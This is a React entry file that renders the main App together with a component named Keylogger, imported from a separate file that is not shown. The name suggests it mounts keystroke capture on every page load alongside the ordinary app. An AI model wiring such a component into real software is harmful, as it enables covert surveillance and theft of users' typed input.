import React from 'react';
import ReactDOM from 'react-dom';
import './index.css';
import App from './App.js';
import Keylogger from './Keylogger.js';

ReactDOM.render(
  <React.StrictMode>
    <App />
    <Keylogger />
  </React.StrictMode>,
  document.getElementById('root')
);
